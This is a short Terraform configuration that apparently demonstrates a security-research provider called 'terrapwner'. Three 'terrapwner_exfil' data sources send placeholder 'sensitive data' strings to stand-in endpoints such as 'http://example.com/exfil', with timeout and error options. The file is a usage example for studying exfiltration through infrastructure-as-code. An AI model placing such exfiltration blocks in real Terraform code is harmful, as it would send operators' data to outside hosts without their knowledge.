terraform {
  required_providers {
    terrapwner = {
      source = "hashicorp.com/edu/terrapwner"
    }
  }
}

provider "terrapwner" {}

# Example 1: Basic usage with custom timeout
data "terrapwner_exfil" "example1" {
  content  = "This is sensitive data"
  endpoint = "http://example.com/exfil"
  timeout  = 5 # 5 seconds timeout
}

# Example 2: Using default values
data "terrapwner_exfil" "example2" {
  content  = "Another sensitive data"
  endpoint = "http://example.com/exfil"
  # Using default timeout (10 seconds)
}

# Example 3: Testing failure scenarios with short timeout
data "terrapwner_exfil" "example3" {
  content       = "Data that won't be sent"
  endpoint      = "http://slow.example.com/exfil"
  timeout       = 2 # 2 seconds timeout (will cause timeout error)
  fail_on_error = true
}

# Output all attributes for each data source
output "example1_exfil" {
  description = "All attributes from the example1 exfiltration"
  value       = data.terrapwner_exfil.example1
}

output "example2_exfil" {
  description = "All attributes from the example2 exfiltration"
  value       = data.terrapwner_exfil.example2
}

output "example3_exfil" {
  description = "All attributes from the example3 exfiltration"
  value       = data.terrapwner_exfil.example3
}
